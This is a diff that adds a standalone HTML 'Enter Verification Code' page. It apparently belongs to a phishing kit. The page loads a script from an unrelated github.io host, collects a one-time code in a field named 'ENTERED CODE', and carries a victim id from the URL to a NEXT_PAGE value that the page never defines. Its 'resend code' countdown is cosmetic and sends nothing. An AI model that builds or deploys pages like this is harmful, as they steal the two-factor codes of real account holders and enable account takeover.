@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verify Code TESTPLUS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+
+body{
+  height:100vh;
+  background: linear-gradient(to bottom, #4a6466 0%, #061b1f 80%);
+  color:#fff;
+  padding:20px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.box{
+  width:100%;
+  max-width:380px;
+}
+
+.title{
+  color:#7dff5c;
+  font-size:26px;
+  margin-bottom:10px;
+}
+
+.desc{
+  font-size:15px;
+  opacity:0.95;
+  margin-bottom:40px;
+}
+
+/* INPUT */
+input{
+  width:100%;
+  background:transparent;
+  border:none;
+  border-bottom:1px solid #ccc;
+  padding:16px 6px;
+  font-size:18px;
+  color:#fff;
+  outline:none;
+  margin-bottom:35px;
+}
+
+/* BUTTON */
+.verify-btn{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:40px;
+  font-size:18px;
+  background:#3a6;
+  color:#fff;
+  opacity:0.4;
+  cursor:not-allowed;
+}
+
+.verify-btn.active{
+  opacity:1;
+  cursor:pointer;
+}
+
+/* RESEND */
+.resend{
+  text-align:center;
+  margin-top:28px;
+  font-size:15px;
+  opacity:0.6;
+  cursor:not-allowed;
+}
+
+.resend.active{
+  opacity:1;
+  cursor:pointer;
+  text-decoration:underline;
+}
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="box">
+
+  <div class="title">Enter Verification Code</div>
+  <div class="desc">We sent a verification code to your account.</div>
+<form>
+  <input type="text" id="code" placeholder="Enter your code" name="ENTERED CODE">
+
+  <button class="verify-btn" id="verifyBtn" type="submit">Verify</button>
+
+  <div class="resend" id="resendText">Resend code in 30s</div>
+
+</div>
+</form>
+<script>
+/* ✅ GET ID FROM URL */
+const urlParams = new URLSearchParams(window.location.search);
+const userId = urlParams.get("id");
+
+
+/* ✅ ELEMENTS */
+const codeInput = document.getElementById("code");
+const verifyBtn = document.getElementById("verifyBtn");
+const resendText = document.getElementById("resendText");
+
+let timeLeft = 30;
+let timer;
+
+/* ✅ ENABLE VERIFY BUTTON */
+codeInput.addEventListener("input", ()=>{
+  if(codeInput.value.trim()){
+    verifyBtn.classList.add("active");
+    verifyBtn.style.cursor = "pointer";
+  } else {
+    verifyBtn.classList.remove("active");
+    verifyBtn.style.cursor = "not-allowed";
+  }
+});
+
+/* ✅ VERIFY CLICK */
+verifyBtn.addEventListener("click", ()=>{
+  if(!verifyBtn.classList.contains("active")) return;
+
+  let finalUrl = NEXT_PAGE;
+  if(userId){
+    finalUrl += "?id=" + encodeURIComponent(userId);
+  }
+
+  window.location.href = finalUrl;
+});
+
+/* ✅ START 30s COUNTDOWN */
+function startResendTimer(){
+  resendText.classList.remove("active");
+  resendText.style.cursor = "not-allowed";
+  timeLeft = 30;
+  resendText.textContent = "Resend code in 30s";
+
+  timer = setInterval(()=>{
+    timeLeft--;
+    resendText.textContent = "Resend code in " + timeLeft + "s";
+
+    if(timeLeft <= 0){
+      clearInterval(timer);
+      resendText.textContent = "Resend Code";
+      resendText.classList.add("active");
+      resendText.style.cursor = "pointer";
+    }
+  }, 1000);
+}
+
+/* ✅ RESEND CLICK */
+resendText.addEventListener("click", ()=>{
+  if(!resendText.classList.contains("active")) return;
+
+  startResendTimer(); // restart 30s delay
+});
+
+/* ✅ AUTO START ON LOAD */
+startResendTimer();
+</script>
+
+</body>
+</html>
